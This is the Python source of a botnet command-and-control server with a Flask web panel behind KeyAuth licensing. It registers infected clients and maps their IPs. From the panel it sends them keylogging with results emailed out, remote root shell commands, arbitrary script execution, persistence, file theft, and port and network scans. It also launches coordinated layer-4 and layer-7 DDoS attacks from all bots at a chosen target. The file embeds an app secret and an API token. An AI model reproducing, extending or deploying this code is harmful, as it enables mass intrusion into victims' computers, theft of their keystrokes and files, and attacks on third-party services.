# System Modules
import os
import sys
import socket
import hashlib
import binascii  
import platform
import threading
import subprocess
import json as jsond 

from concurrent.futures.thread import ThreadPoolExecutor
from typing import Tuple
from uuid import uuid4  
from time import sleep


# Downloaded Modules
import folium
import ipinfo
import requests

from Crypto.Util.Padding import pad, unpad   
from flask_socketio import SocketIO
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from pystyle import *
from tkinter import *
from flask import *

# Server info
ippp      	= "192.168.0.2" 	# IP_HERE
port_    	= "1888"			# PORT_HERE
port   		= int(port_)

#region Keyauth
class api:
    name = ownerid = secret = version = hash_to_check = ""

    def __init__(self, name, ownerid, secret, version, hash_to_check):
        self.name = name

        self.ownerid = ownerid

        self.secret = secret

        self.version = version
        self.hash_to_check = hash_to_check
        self.init()

    sessionid = enckey = ""
    initialized = False

    def init(self):

        if self.sessionid != "":
            print("You've already initialized!")
            sleep(2)
            exit(0)
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        self.enckey = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("init").encode()),
            "ver": encryption.encrypt(self.version, self.secret, init_iv),
            "hash": self.hash_to_check,
            "enckey": encryption.encrypt(self.enckey, self.secret, init_iv),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        if response == "KeyAuth_Invalid":
            print("The application doesn't exist")
            sys.exit()

        response = encryption.decrypt(response, self.secret, init_iv)
        json = jsond.loads(response)

        if json["message"] == "invalidver":
            if json["download"] != "":
                print("New Version Available")
                download_link = json["download"]
                os.system(f"start {download_link}")
                sys.exit()
            else:
                print("Invalid Version, Contact owner to add download link to latest app version")
                sys.exit()

        if not json["success"]:
            print(json["message"])
            sys.exit()

        self.sessionid = json["sessionid"]
        self.initialized = True
        self.__load_app_data(json["appinfo"])

    def login(self, user, password, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("login").encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            return "logged in"
        else: return str(json["message"])

    def license(self, key, hwid=None):
        self.checkinit()
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("license").encode()),
            "key": encryption.encrypt(key, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            print("successfully logged into license")
        else:
            print(json["message"])
            sys.exit()

    def var(self, name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("var").encode()),
            "varid": encryption.encrypt(name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            sys.exit()

    def getvar(self, var_name):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("getvar").encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["response"]
        else:
            print(json["message"])
            sys.exit()

    def setvar(self, var_name, var_data):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("setvar").encode()),
            "var": encryption.encrypt(var_name, self.enckey, init_iv),
            "data": encryption.encrypt(var_data, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        
        if json["success"]:
            return True
        else:
            print(json["message"])
            sys.exit()    

    def ban(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("ban").encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        
        if json["success"]:
            return True
        else:
            print(json["message"])
            sys.exit()    

    def file(self, fileid):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("file").encode()),
            "fileid": encryption.encrypt(fileid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if not json["success"]:
            print(json["message"])
            sleep(5)
            sys.exit()
        return binascii.unhexlify(json["contents"])

    def webhook(self, webid, param):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("webhook").encode()),
            "webid": encryption.encrypt(webid, self.enckey, init_iv),
            "params": encryption.encrypt(param, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            sleep(5)
            sys.exit()

    def check(self):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("check").encode()),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def checkblacklist(self):
        self.checkinit()
        hwid = others.get_hwid()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()
        post_data = {
            "type": binascii.hexlify(("checkblacklist").encode()),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }
        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)
        if json["success"]:
            return True
        else:
            return False

    def log(self, message):
        self.checkinit()
        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("log").encode()),
            "pcuser": encryption.encrypt(os.getenv('username'), self.enckey, init_iv),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        self.__do_request(post_data)

    def checkinit(self):
        if not self.initialized:
            print("Initialize first, in order to use the functions")
            sys.exit()

    def __do_request(self, post_data):

        rq_out = requests.post(
            "https://keyauth.win/api/1.0/", data=post_data
        )

        return rq_out.text

    class application_data_class:
        numUsers = numKeys = app_ver = customer_panel = onlineUsers = ""
    class user_data_class:
        username = ip = hwid = expires = createdate = lastlogin = subscription = ""

    user_data = user_data_class()
    app_data = application_data_class()

    def __load_app_data(self, data):
        self.app_data.numUsers = data["numUsers"]
        self.app_data.numKeys = data["numKeys"]
        self.app_data.app_ver = data["version"]
        self.app_data.customer_panel = data["customerPanelLink"]
        self.app_data.onlineUsers = data["numOnlineUsers"]

    def __load_user_data(self, data):
        self.user_data.username = data["username"]
        self.user_data.ip = data["ip"]
        self.user_data.hwid = data["hwid"]
        self.user_data.expires = data["subscriptions"][0]["expiry"]
        self.user_data.createdate = data["createdate"]
        self.user_data.lastlogin = data["lastlogin"]
        self.user_data.subscription = data["subscriptions"][0]["subscription"]
        self.user_data.subscriptions = data["subscriptions"]

class others:
    @staticmethod
    def get_hwid():
        if platform.system() != "Windows":
            return subprocess.Popen('hal-get-property --udi /org/freedesktop/Hal/devices/computer --key system.hardware.uuid'.split())

        cmd = subprocess.Popen(
            "wmic useraccount where name='%username%' get sid", stdout=subprocess.PIPE, shell=True)

        (suppost_sid, error) = cmd.communicate()

        suppost_sid = suppost_sid.split(b'\n')[1].strip()

        return suppost_sid.decode()

class encryption:
    @staticmethod
    def encrypt_string(plain_text, key, iv):
        plain_text = pad(plain_text, 16)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        raw_out = aes_instance.encrypt(plain_text)

        return binascii.hexlify(raw_out)

    @staticmethod
    def decrypt_string(cipher_text, key, iv):
        cipher_text = binascii.unhexlify(cipher_text)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        cipher_text = aes_instance.decrypt(cipher_text)

        return unpad(cipher_text, 16)

    @staticmethod
    def encrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.encrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            sys.exit()

    @staticmethod
    def decrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.decrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            sys.exit()


# Un Comment this function before release
def getchecksum():
	path = os.path.basename(__file__)
	if not os.path.exists(path): path = path[:-2] + "py"
	md5_hash = hashlib.md5()
	a_file = open(path,"rb")
	content = a_file.read()
	md5_hash.update(content)
	digest = md5_hash.hexdigest()
	return path

keyauthapp = api(
    name = "BotNet Auth",
    ownerid = "gOtVyaoa7S",
    secret = "2addeb91d314c6531c8990f84f8aacf2ca2684a2187901dea4d71e5f8ed56da7",
    version = "1.0",
    hash_to_check = getchecksum()
)
#endregion

#region Debug
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
END = '\033[0m'

debug = True
if debug: print(YELLOW + "DEBUG MODE ENABLED" + END)
# if not debug then print_debug() will not print anything
if os.path.exists("log.txt"): os.remove("log.txt")
def print_debug(str): 
	if debug:
		print(f"{END}[{RED}DEBUG{END}] " + END + str)
		with open ("log.txt", "a+") as f: f.write(f"[DEBUG]  {str}\n")
#endregion
		
#region Variables

global command_input
command_input = ""

# Web GUI
app 			= Flask(__name__)
socketio 		= SocketIO(app)
app.secret_key 	= os.urandom(12)

# Client info
public_ips 		= []	# Client IP list	
hostname_list 	= []	# Collects Hostname list
all_connections = []	# list of all connections
all_address 	= []	# list of all addresses
idNum       	= 0		# Bot ID number
database    	= []	# list of all clients
out 			= ""	# Command output
ddos_output 	= ""	# DDoS output
shell_out 	    = ""	# Shell Command output
keylogger_out	= ""	# Keylogger output
maxWorkers		= 500	# Max number of workers

temp 			= os.getenv('temp')
stop 			= False	
#endregion

#region BOTNET
class client:
    def __init__(self, info):
        global idNum
        self.idNum = idNum
        idNum += 1
        self.persistence = False
        self.IP = info['IP']
        self.hostname = info['hostname']
        self.OS = info['OS']
        self.status = info['status']

#region Contantly Running Threads
def check_online(i):
    try:
        all_connections[i].send("ping".encode())
        answer = all_connections[i].recv(1024*5).decode("ascii")

        if answer == "pong": return "Online"
        else: return "Offline"
    except BrokenPipeError: return "Offline"
    except: return "Offline"

def last_online():
	while True: 
		if database != []:
			if all_connections != []:
				for i in range(len(database)):
					try: 
						database[i].status = check_online(i)
					except BrokenPipeError:
						del all_address[i]
						del all_connections[i]
			else:
				try:
					for i in database: i.status = "Offline"
				except: pass
		sleep(5)

def map_update():
	global public_ips
	access_token = '98202d3de7c279'
	handler = ipinfo.getHandler(access_token)

	while True:
		try:
			mypi2 = handler.getDetails("198.58.117.105")	# get my ip location						
			lat = mypi2.loc.split(",")[0]					# sperate lat and long
			long = mypi2.loc.split(",")[1]
			location = [lat, long]
			mapp = folium.Map(zoom_start=4, min_zoom=3, location=location, tiles="Stamen Terrain")            # create map
			folium.Marker(location, tooltip="SERVER").add_to(mapp)


			for i in public_ips:
				try: 
					mypi = handler.getDetails(i)
					lat = mypi.loc.split(",")[0]
					long = mypi.loc.split(",")[1]
					location = [lat, long]
					folium.Marker(location, tooltip=f"IP: {i}").add_to(mapp)	# add marker to map
				except: pass

			mapp.save("templates\\map_data.html")
		except Exception as e: print_debug("Map Update Thread: " + str(e))
		
		sleep(5)
#endregion

#region Server Initialization

def collect():
	global hostname_list, public_ips
	hostname_list = []
	public_ips = []
	while not stop:
		try:
			conn, address = sock.accept()
			all_connections.append(conn)
			all_address.append(address)

			conn.send("sendinfo".encode())
			out = f'{conn.recv(1024*5).decode("ascii")}'

			out = out.split()
			info = {}
			info['COMMAND'] = 'INFO'
			
			if hostname_list != []:					# if there are clients in the list
				if out[1] not in hostname_list:
					info["IP"] 			= out[0]
					info["hostname"] 	= out[1]
					info["OS"] 			= out[2]
					info["status"]  	= str(out[3])
					print_debug("Collect Thread: --INFO--  Client IP: " + str(out[0]) + " Hostname: " + str(out[1]) + " OS: " + str(out[2]) + " Status: " + str(out[3]))

					hostname_list.append(out[1])			# add client hostname to list

					if str(out[0]) not in public_ips:		# if client ip is in already in list
						public_ips.append(out[0])			# add client public ip to list

					database.append(client(info))
				else: print_debug("Collect Thread: client already in database")
			
			else:
					print_debug("Collect Thread: No clients in list adding new client")
					print_debug("Collect Thread: --INFO--  Client IP: " + str(out[0]) + " Hostname: " + str(out[1]) + " OS: " + str(out[2]) + " Status: " + str(out[3]))
					info["IP"] 			= out[0]
					info["hostname"] 	= out[1]
					info["OS"] 			= out[2]
					info["status"]  	= str(out[3])

					hostname_list.append(out[1])
					public_ips.append(out[0])
					database.append(client(info))
		
		except socket.timeout: continue
		except socket.error: continue
		except Exception as e: print_debug("Error accepting connections: " + str(e))
		sleep(2)

def check(display:bool=False, always:bool=True):
	global all_ids
	while not stop:
		c=0
		for n,tcp in zip(all_address,all_connections):	# loop through all clients
			c+=1
			try:
				tcp.send(str.encode("ping"))
				if tcp.recv(1024).decode("utf-8") and display: print(f'[+]    {str(n[0])+":"+str(n[1])}    LIVE')
			except:
				if display: print(f'[+]    {str(n[0])+":"+str(n[1])}    DEAD')
				del all_address[c-1]
				del all_connections[c-1]
				continue
		if not always: break
		sleep(0.5)

def _bind(connect:Tuple[str,int]) -> bool:
	global sock
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.bind(connect)
		sock.listen(50)
		sock.settimeout(0.5)

		print_debug("Bind Thread: Socket bound successfully starting to collect connections")

		threading.Thread(target=collect).start()
		threading.Thread(target=check).start()
		return True
	except: pass

def call_script(i, cmd):
	try:
		all_connections[i].send(cmd.encode())
		return (f'{all_connections[i].recv(1024*5).decode("ascii")}')
	except BrokenPipeError:
		del all_address[i]
		del all_connections[i]

def _all_clients(i, cmd):
	try:
		all_connections[i].send(cmd.encode())
		return (f'{all_connections[i].recv(1024*5).decode("ascii")}')
	except BrokenPipeError:
		del all_address[i]
		del all_connections[i]
#endregion

#region Send Commands
def _take_cmd(bot, cmd):
	if cmd == "admincheck": 
		return call_script(bot, cmd)

	elif cmd == "jigglecursor":
		return call_script(bot, cmd)

	elif cmd == "jigglecursorstop":
		return call_script(bot, cmd)

	elif cmd == "systeminfo":
		return call_script(bot, cmd)

	elif cmd == "stopprocessscontrol":
		return call_script(bot, cmd)

	elif cmd == "networkscan":
		return call_script(bot, cmd)

	elif cmd == "livekeyylogger":
		return call_script(bot, cmd)


	elif "processcontrol" in cmd:
		return call_script(bot, cmd)

	elif "stress" in cmd:
		return call_script(bot, cmd)
	
	elif "keylogger" in cmd:
		return call_script(bot, cmd)
	
	elif "runscript" in cmd:
		return call_script(bot, cmd)

	elif "download" in cmd:
		return call_script(bot, cmd)

	elif "scanfiles" in cmd:
		return call_script(bot, cmd)

	elif "persistance" in cmd:
		return call_script(bot, cmd)

	elif "portscan" in cmd:
		return call_script(bot, cmd)

	else: return(f"Error: {cmd} is not a valid command")

def _take_shell_cmd(i, cmd):
	try:
		all_connections[i].send(cmd.encode())
		return (f'{all_connections[i].recv(1024*5).decode("ascii")}')
	except BrokenPipeError:
		del all_address[i]
		del all_connections[i]
	except: return(f"Error")

def command_check(command):
	if command == "stress": 
		stress_time 	= request.form.get('stress-time')
		stress_amount 	= request.form.get('stress-tasks')
		if stress_time == "" or stress_amount == "": return("Error: Please fill in all fields")
		else: return (f'{command} {stress_time} {stress_amount}')

	elif command == "keylogger":
		keylogger_intervals 		= request.form.get('keylogger-intervals')
		keylogger_reciever_email 	= request.form.get('keylogger-reciever-email')
		if keylogger_intervals == "" or keylogger_reciever_email == "": return("Error: Please fill in all fields")
		else: return (f'{command} {keylogger_intervals} {keylogger_reciever_email}')

	elif command == "runscript":
		script_name 	= request.form.get('runscript-name')
		script_code 	= request.form.get('runscript-code')
		script_type 	= request.form.get('script-type-selection')
		if script_name == "" or script_code == "" or script_type == "": return("Error: Please fill in all fields")
		else: return (f'{command} {script_name} {script_type} {script_code}')

	elif command == "download":
		download_path 	= request.form.get('download-path')
		if download_path == "": return("Error: Please fill in all fields")
		else: return (f'{command} {download_path}')

	elif command == "scanfiles":
		scan_files 		= request.form.get('scan-files')
		if scan_files == "": return("Error: Please fill in all fields")
		else: return (f'{command} {scan_files}')

	elif command == "processcontrol":
		process_names 	= request.form.get('process-names')
		if process_names == "": return("Error: Please fill in all fields")
		else: return (f'{command} {process_names}')

	elif command == "persistance":
		persistance_name = request.form.get('persistance-name')
		if persistance_name == "": return("Error: Please fill in all fields")
		else: return (f'{command} {persistance_name}')

	elif command == "portscan":
		port_scan_starting_port = request.form.get('portscan-starting-port')
		port_scan_ending_port 	= request.form.get('portscan-ending-port')
		port_scan_threads 		= request.form.get('portscan-threads')
		if port_scan_starting_port == "" or port_scan_ending_port == "" or port_scan_threads == "": return("Error: Please fill in all fields")
		else: return (f'{command} {port_scan_starting_port} {port_scan_ending_port} {port_scan_threads}')

	elif command == "ddos":
		ddos_target 	= request.form.get('ddos-website-target')
		ddos_method 	= request.form.get('ddos-website-method')
		ddos_time 		= request.form.get('ddos-website-time')
		ddos_threads 	= request.form.get('ddos-website-thread')
		if ddos_target == "" or ddos_method == "" or ddos_time == "" or ddos_threads == "": return("Error: Please fill in all fields")
		else: return (f'{command} {ddos_method} {ddos_target} {ddos_threads} {ddos_time}')

	else: return command

def ddos_command_check_layer4(command):
	ddos_target 	= request.form.get('layer4-target')
	ddos_port 		= request.form.get('layer4-port')
	ddos_threads 	= request.form.get('layer4-threads')
	ddos_duration 	= request.form.get('layer4-duration')
	if ddos_target == "" or ddos_port == "" or ddos_threads == "" or ddos_duration == "": return("Error: Please fill in all fields")
	else: return f"ddos {command} {ddos_target} {ddos_port} {ddos_threads} {ddos_duration}"

def ddos_command_check_layer7(command):
	ddos_target 	= request.form.get('layer7-target')
	ddos_proxy_type = request.form.get('layer7-proxy-type')
	ddos_proxy_list = request.form.get('layer7-proxy-list')
	ddos_rpc 		= request.form.get('layer7-rpc')
	ddos_threads 	= request.form.get('layer7-threads')
	ddos_duration 	= request.form.get('layer7-duration')
	if ddos_target == "" or ddos_proxy_type == "" or ddos_proxy_list == "" or ddos_rpc == "" or ddos_threads == "" or ddos_duration == "": return("Error: Please fill in all fields")
	else: return f"ddos {command} {ddos_target} {ddos_proxy_type} {ddos_proxy_list} {ddos_rpc} {ddos_threads} {ddos_duration}"

#endregion

#region Web GUI
@app.route('/')
def redirectLogin(): return redirect(url_for('login'))


@app.route('/login.html', methods=['post', 'get'])
def login():
	if request.method == 'POST':
		username = request.form.get('userid')
		password = request.form.get('passid')
		auth = keyauthapp.login(username,password)


		if auth == "logged in":
			session['loggedin'] = True
			session['username'] = username
			print_debug("Login Thread: User: " + username + " logged in successfully")
			return redirect(url_for('dashboard'))
		else: return render_template('login.html', loginStatus=auth)
	return render_template('login.html')


@app.route('/favicon.ico')
def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static'),
                               'favicon.ico', mimetype='image/vnd.microsoft.icon')


@app.route('/dashboard.html')
def dashboard():
	try:
		if session['loggedin'] == True: return render_template('dashboard.html', database=database)
	except: return redirect('login.html')


@app.route('/map.html')
def map():
	try:
		if session['loggedin'] == True: return render_template('map.html')
	except: return redirect('login.html')


@app.route('/map_data.html')
def map_data():
	try:
		if session['loggedin'] == True: return render_template('map_data.html')
	except: return redirect('login.html')


@app.route('/sendcommands.html', methods=['get', 'post'])
def sendcommands():
	try:
		global out
		if session['loggedin']:				# if user is logged in
			if request.method == 'POST':	# if user is sending commands
				idNumber = request.form.get('idNumber')
				command_ = request.form.get('command-selection')
				command = ""

				if database == []: return render_template('sendcommands.html', commandStatus='No connected clients', commandOutput=out)
                
				if command_ == "": return render_template('sendcommands.html', commandStatus='No command selected', commandOutput=out)

				elif command_ == "clear":
					out = "" # clear output
					return render_template('sendcommands.html', commandStatus='Output Cleared', commandOutput=out)

				elif command_ == "listbots":
					out += f"\n\nConnected bots: {str(len(database))}"
					return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)

				else:
					commandCheck = str(command_check(str(command_)))
					if commandCheck == "Error: Please fill in all fields": return render_template('sendcommands.html', commandStatus=commandCheck, commandOutput=out)
					else:
						command += commandCheck

						print_debug("Sending command: " + str(command) + " to system ID num: " + str(idNumber))
						for x in database:
							if str(x.idNum) == str(idNumber):
								try: 
									out += "\n\n" + x.hostname + ": " + _take_cmd(int(x.idNum), str(command))
									return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
								except Exception as e: 
									print_debug("Error while sending command" + str(e))
									return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
						return render_template('sendcommands.html', commandStatus='System ID not found', commandOutput=out)
			
			else: return render_template('sendcommands.html', commandOutput=out)

	except Exception as e:
		print_debug(f"Error while sending command: {e}")
		return redirect('login.html')


@app.route('/ddos.html', methods=['get', 'post'])
def ddos():
	try:
		global ddos_output
		if session['loggedin']:				# if user is logged in
			if request.method == 'POST':	# if user is sending commands
				command_layer7 = request.form.get('command-selection-layer7') # get layer7 method from form
				command_layer4 = request.form.get('command-selection-layer4') # get layer4 method from form

				if database == []: return render_template('ddos.html', commandStatus='No connected clients', commandOutput=ddos_output)

				elif command_layer7 == "" and command_layer4 == "": return render_template('ddos.html', commandStatus='No command selected', commandOutput=ddos_output)

				elif command_layer7 != "" and command_layer4 == "": # layer7 command
					commandCheck = str(ddos_command_check_layer7(str(command_layer7)))
					if commandCheck == "Error: Please fill in all fields": ddos_output += "Error: Please fill in all fields" ; return render_template('ddos.html', commandStatus=commandCheck, commandOutput=ddos_output)
					else: 
						with ThreadPoolExecutor(max_workers=500) as executor:
							try: 	
								xx = 0
								for x in database: print_debug(f"Sending {str(commandCheck)} to {int(x.idNum)}") ; executor.submit(_all_clients(int(x.idNum), str(commandCheck))) ; xx += 1
								command_checkkk = commandCheck[5:]
								command__ = command_checkkk.split(" ")
								ddos_output += f"""\n\n
        --------- Attack Started ---------

        Bots:           \t{xx}
        Methods:        \t{command__[0]}
        Target:         \t{command__[1]}
        Proxy Type:     \t{command__[2]}
        RPC:            \t{command__[4]}
        Threads:        \t{command__[5]}
        Time:           \t{command__[6]}

								"""
								return render_template('ddos.html', commandStatus='Command Success', commandOutput=ddos_output)
							
							except Exception as e: print_debug("Error while sending attack" + str(e)) ; return render_template('ddos.html', commandStatus='Command Error', commandOutput=ddos_output)

				elif command_layer7 == "" and command_layer4 != "": # layer4 command
					commandCheck = str(ddos_command_check_layer4(str(command_layer4)))
					if commandCheck == "Error: Please fill in all fields": ddos_output += "Error: Please fill in all fields" ; return render_template('ddos.html', commandStatus=commandCheck, commandOutput=ddos_output)
					else: 
						with ThreadPoolExecutor(max_workers=500) as executor:
							try: 	
								xx = 0
								for x in database: print_debug(f"Sending {str(commandCheck)} to {int(x.idNum)}") ; executor.submit(_all_clients(int(x.idNum), str(commandCheck))) ; xx += 1
								# remove ddos from command
								command_checkkk = commandCheck[5:]
								print_debug(f"Sending {command_checkkk}")
								command__ = command_checkkk.split(" ")
								ddos_output += f"""\n\n
        --------- Attack Started ---------

        Bots:   \t{xx}
        Method: \t{command__[0]}
        Target: \t{command__[1]}
        Port:   \t{command__[2]}
        Threads:\t{command__[3]}
        Time:   \t{command__[4]}

								"""
								return render_template('ddos.html', commandStatus='Command Success', commandOutput=ddos_output)
							
							except Exception as e: print_debug("Error while sending attack" + str(e)) ; return render_template('ddos.html', commandStatus='Command Error', commandOutput=ddos_output)
			
			else: return render_template('ddos.html', commandOutput=ddos_output)

	except Exception as e:print_debug(f"Error while sending command: {e}") ; return redirect('login.html')


@app.route('/shell.html', methods=['get', 'post'])
def shell():
	try:
		global shell_out
		if session['loggedin']:				# if user is logged in
			if request.method == 'POST':	# if user is sending commands
				command = ""
				idNumber = request.form.get('idNumber')
				command = str(request.form.get('command-shell'))

				print_debug("Sending shell command: " + str(command) + " to system ID num: " + str(idNumber))

				if database == []: return render_template('shell.html', commandStatus='No connected clients', commandOutput=shell_out)

				if command == "clear":
					shell_out = "" # clear output
					return render_template('shell.html', commandStatus='Output Cleared', commandOutput=shell_out)
				
				else:
					command = "root " + str(request.form.get('command-shell'))
					for x in database:
						if str(x.idNum) == str(idNumber):
							try: 
								shell_out += f"\n\nC:\\Users\\{x.hostname}> {request.form.get('command-shell')}\n\n{_take_shell_cmd(int(x.idNum), str(command))}"
								return render_template('shell.html', commandStatus='Command Success', commandOutput=shell_out)
							except Exception as e: 
								print_debug("Error while sending command" + str(e))
								return render_template('shell.html', commandStatus='Command Error', commandOutput=shell_out)
					return render_template('shell.html', commandStatus='System ID not found', commandOutput=shell_out)
			else: return render_template('shell.html', commandOutput=shell_out)

	except Exception as e:
		print_debug(f"Error while sending command: {e}")
		return redirect('login.html')


@app.route('/logout.html')
def logout():
	session.pop('loggedin', None)
	session.pop('username', None)
	return redirect(url_for('login'))

#endregion

#region Removed Commands

# elif "webcam" in cmd:
# 	bots = ''
# 	for i, (ip, port) in enumerate(all_address):
# 		try:
# 			bots +=(f'{[i]}    {public_ips[i]}    CONNECTED{RESET}\n')
# 		except:
# 			bots +=(f'{[i]}    {ip}:{port}    CONNECTED{RESET}\n')
# 	print_logo()
# 	print("\n\t\tClients\t")
#	print("-----------------------------------------" + "\n" + bots)
# 	b = int(input(f"\n    {RED}{dot}{WHITE} Bot\t{CYAN}: {RESET}"))
# 	
# 	print("\n")
# 	_port = Write.Input("Enter Port >> ", Colors.purple_to_blue, interval=0.0002)
# 	_create_webcam_server(_port)
# 	clear()
# 	print_logo()
# 	Write.Input("MAKE SURE TO RUN THE WEBCAM SERVER BEFORE GOING ANY FURTHER", Colors.red_to_white, interval=0.0002)
# 	print("\n")
# 	with ThreadPoolExecutor(max_workers=25) as executor:
# 		for i, (ip, port) in enumerate(all_address):
# 			if i == b:
# 				executor.submit(call_script, i, ip, port, cmd)
# 			elif b == 420:
# 				executor.submit(call_script, i, ip, port, cmd)

#endregion
#endregion

if __name__ == '__main__':
	if platform.system() == "Windows":
		threading.Thread(target=last_online).start() ; threading.Thread(target=map_update).start()
		if _bind((ippp, port)): print_debug(f'Botnet server started on {ippp}:{port}')
		pppp = "1666" ; pp = int(pppp) # HOSTPORTHERE
		socketio.run(app.run(host="192.168.0.2", port=pp)) # HOSTIPHERE

	else: print("This program is only compatible with Windows") ; os._exit(1)